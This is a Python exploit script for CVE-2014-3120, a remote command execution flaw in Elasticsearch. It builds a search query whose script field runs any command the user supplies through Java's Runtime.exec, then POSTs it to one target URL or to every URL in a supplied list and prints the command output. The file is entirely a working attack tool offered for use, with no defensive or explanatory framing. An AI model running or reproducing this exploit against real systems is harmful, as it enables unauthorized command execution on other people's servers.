from ast import Store
import re
import urllib.parse
import urllib3
import argparse
import requests
import json

import sys

urllib3.disable_warnings()

def do_banner():
    print("")
    print("  _______      ________    ___   ___  __ _  _         ____  __ ___   ___  ")
    print(" / ____\ \    / /  ____|  |__ \ / _ \/_ | || |       |___ \/_ |__ \ / _ \ ")
    print("| |     \ \  / /| |__ ______ ) | | | || | || |_ ______ __) || |  ) | | | |")
    print("| |      \ \/ / |  __|______/ /| | | || |__   _|______|__ < | | / /| | | |")
    print("| |____   \  /  | |____    / /_| |_| || |  | |        ___) || |/ /_| |_| |")
    print(" \_____|   \/   |______|  |____|\___/ |_|  |_|       |____/ |_|____|\___/ ")
    print("")

proxy = {
    'http' : '127.0.0.1:8080',
    'https' : '127.0.0.1:8080'
}

if __name__ == "__main__":

    do_banner()

    parser = argparse.ArgumentParser(description='Elasticsearch Command Execute (CVE-2014-3120)')
    parser.add_argument('-u',action="store",dest="url",help="The url to test")
    parser.add_argument('-c',action="store",dest="command",required=True,help="The command to execute")
    parser.add_argument('-l',action="store",dest="list",help="The url list")
    args = parser.parse_args()

    if args.url and args.list:
        print("User specified both '-u' and '-l'. Only one may be chosen")
        sys.exit(1)

    if not args.url and not args.list:
        print("User specified neither '-u' nor '-l'. User must choose one")
        sys.exit(1)
    
    if args.command:
        print('[+] Generating a payload')
        exploit = '''{
    "size": 1,
    "query": {
        "filtered": {
            "query": {
                "match_all": {}
            }
        }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\"'''+args.command+'''\\").getInputStream()).useDelimiter(\\"\\\\\\\\A\\").next();"
        }
    }
}'''
    
    if args.url:
        print('[+] Sending expoit at '+args.url)
        try:
            r=requests.post(args.url+'/_search?pretty',data=exploit,proxies=proxy)
            c=re.compile(r'"command" : (.*)').findall(r.text)
            print(c)
        except:
            print('[-] The HTTP request failed')
            sys.exit(0)

    if args.list:
        print('Loading url file...')
        with open(args.list, 'r') as file:
            f = file.readlines()
        for i in f:
            i = i.strip('\n')
            try:
                print('[+] Sending expoit at '+i)
                r=requests.post(i+'/_search?pretty',data=exploit,proxies=proxy)
                c=re.compile(r'"command" : (.*)').findall(r.text)
                print(c)
            except:
                print('[-] The HTTP request failed')
                sys.exit(0)